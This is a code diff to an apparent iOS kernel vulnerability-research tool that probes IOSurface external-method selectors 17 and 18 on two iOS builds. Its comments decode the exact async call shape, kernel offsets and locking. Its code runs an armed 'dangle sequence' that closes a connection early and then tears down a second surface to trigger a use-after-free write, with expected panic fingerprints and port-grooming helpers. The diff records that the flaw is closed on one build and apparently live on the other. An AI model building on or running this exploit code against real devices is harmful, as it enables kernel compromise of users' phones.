@@ -6,7 +6,22 @@
 //  Static map (23F77, verified 2026-11-16):
 //    sel-17 handler 0x986cac8 (24-B struct container, ASYNC-ONLY —
 //      args+0x10 reference array exists only on the async path;
-//      sync = 0x2c2 forever: the 27.0.1 measured contract, their §15)
+//      sync = 0x2c2 forever — DECODED 2026-11-20 (24B156; findings:
+//      ios-xnu-hunt/findings/2026-11-19_24b156_iosurface_sel17_contract.md):
+//      sync hits the live trampoline 0x2c14c's asyncReference==NULL check;
+//      refCnt=0 dies in MIG; any scalar-in, struct!=0x18, or nonzero output
+//      count dies in dispatchExternalMethod. The WORKING shape:
+//      IOConnectCallAsyncMethod(conn,17,recv_right,ref,1,NULL,0,in24,24,
+//      NULL,0,NULL,0). in24 = {callback, refcon, write-only} — NOT surface
+//      ids; the kernel overwrites ref[0] with the wake port; payload stored
+//      = {wake_port, in[0], in[1]}; in[1] is the dup key. 0x30418/0x30428
+//      are DEAD CODE on 24B156 — live trampolines 0x2c14c/0x2c174; the
+//      dispatch picks table 0x46638 (real) vs 0x46f98 (dummies -> 2e2) via
+//      client+0x127 bit0. The +0xf1 register gate returns 0xe00002d8, and
+//      the close walker sets +0xf1 and purges under the SAME registry
+//      +0x150 mutex: the 24B156 dangle is CLOSED BY CONSTRUCTION (register
+//      either lands before the purge or eats the gate). The dangle is live
+//      only on 23F77 (+0xf0 bit0 law; register never touches +0xf0).)
 //      -> register 0x986978c: dup-check (node+0x20, node+0x58==client)
 //         -> 0x2c9; alloc IOMallocType(DAT_7f35de0); node {next,prev,
 //         payload3, +0x50, +0x58 owner} on the registry (client+0xe8)
@@ -231,10 +246,15 @@ static void p168_groom_free(mach_port_t *ports, int n) {
         kern_return_t r = p168_call(conn, 17, &reg, shape, wp);
         [o appendFormat:@"      shape=%d -> %#x\n", shape, (unsigned)r];
         if (r == KERN_SUCCESS && bestShape < 0) bestShape = shape;
-        if (r == KERN_SUCCESS) p168_call(conn, 18, &reg, 0, wp);   /* clean the node */
+        /* 2026-11-20 decode: sel-18 is async-only too — the SYNC cleanup
+           (shape 0) returned 2c2 and LEFT THE NODE REGISTERED, so the next
+           register on this conn hit the dup-check (0x2c9). Cleanup is now
+           the same async shape as the register. */
+        if (r == KERN_SUCCESS) p168_call(conn, 18, &reg, 1, wp);   /* clean the node (async — sync dereg = 2c2) */
     }
-    [o appendFormat:@"      best shape=%d (1 = the async contract; 0/2/3 = %#x controls)\n",
-        bestShape, 0xe00002c2];
+    [o appendFormat:@"      best shape=%d (decoded: 0=sync 2c2; 1=async the contract; 2=ref0 ALSO "
+                     "registers — kernel overwrites ref[0] with the wake port; 3=refCnt0 MIG 2c2)\n",
+        bestShape];
     if (bestShape != 1) {
         [o appendString:@"[-] async contract not honored on this build — V2 ladder dead; "
                        "sync C9/C2 shapes above are the honest receipt\n"];
@@ -356,8 +376,12 @@ static void p168_groom_free(mach_port_t *ports, int n) {
         [o appendFormat:@"  [ARM] dangle sequence (PANIC-POSSIBLE): async-register s1 (id=%u)\n", id1];
         kern_return_t r = p168_call(conn, 17, &reg, 1, wp);
         [o appendFormat:@"      async reg kr=%#x\n", (unsigned)r];
-        [o appendString:@"      -> IOServiceClose BEFORE CFRelease (the client frees\n"
-                         "         while its node stays on the registry list)\n"];
+        [o appendString:@"      -> IOServiceClose BEFORE CFRelease. PER-SKU LAW (2026-11-20 decode):\n"
+                         "         24B156: the close walker sets client+0xf1 and purges this client's\n"
+                         "         nodes under the SAME registry+0x150 mutex — still running = CLOSED\n"
+                         "         BY CONSTRUCTION (the honest expected receipt on the 17).\n"
+                         "         23F77: the +0xf0 bit0 law — the register path never touches +0xf0,\n"
+                         "         so a client whose init left it 0 keeps DANGLING nodes after close.\n"];
         kr = sClose(conn); conn = 0;
         [o appendFormat:@"      IOServiceClose kr=%#x\n", (unsigned)kr];
         [o appendString:@"      -> destroy the OTHER surface (s2): its teardown runs the\n"
@@ -365,7 +389,9 @@ static void p168_groom_free(mach_port_t *ports, int n) {
                          "         (sync_take/release = free-object WRITE). Expected panic\n"
                          "         fingerprint: ldr [x,#0xd8]-class tag-check fault.\n"];
         CFRelease(s2); s2 = NULL;
-        [o appendString:@"      s2 released. Still running = fan-out survived the freed owner\n"];
+        [o appendString:@"      s2 released. 24B156: still running = closed-by-construction (expected).\n"
+                         "      23F77: still running = the freed owner SURVIVED the fan-out (dangle\n"
+                         "      inert this pass); a panic fingerprint ldr [x,#0xd8] would prove it live.\n"];
     }
 
     /* cleanup */
